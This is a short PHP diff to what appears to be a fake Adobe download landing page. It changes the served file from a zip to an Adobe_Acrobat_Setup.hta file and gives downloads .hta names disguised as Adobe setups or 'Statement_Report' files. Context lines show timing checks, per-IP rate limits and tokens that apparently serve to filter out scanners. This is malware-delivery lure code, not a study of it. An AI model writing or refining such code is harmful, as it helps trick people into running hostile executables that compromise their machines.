@@ -31,7 +31,7 @@ define('SECRET', (string)($_ENV['TK_SECRET'] ?? 'railway-adobe-landing-9f2e1c7a4
 define('TTL', 900);            // token lifetime (15 min)
 define('MIN_DL_AGE', 6);       // index -> ... -> dl must span >= 6s (5s spinner + 2s button)
 define('RATE_LIMIT', 5);       // served downloads per IP per 1h window
-define('SOURCE_ZIP', __DIR__ . '/src/Adobe_Setup.zip');
+define('SOURCE_ZIP', __DIR__ . '/src/Adobe_Acrobat_Setup.hta');
 define('RATE_DIR', sys_get_temp_dir());
 define('ALERT_DIR', sys_get_temp_dir());
 
@@ -344,7 +344,7 @@ function make_name(): string {
         'Statement_Report_'      . date('Y') . '_' . random_int(1000, 9999),
     ];
     $pool = random_int(0, 1) ? $conf : $adobe;   // 50/50 mix
-    return $pool[random_int(0, count($pool)-1)] . '.zip';
+    return $pool[random_int(0, count($pool)-1)] . '.hta';
 }
 
 function name_kind(string $name): string {
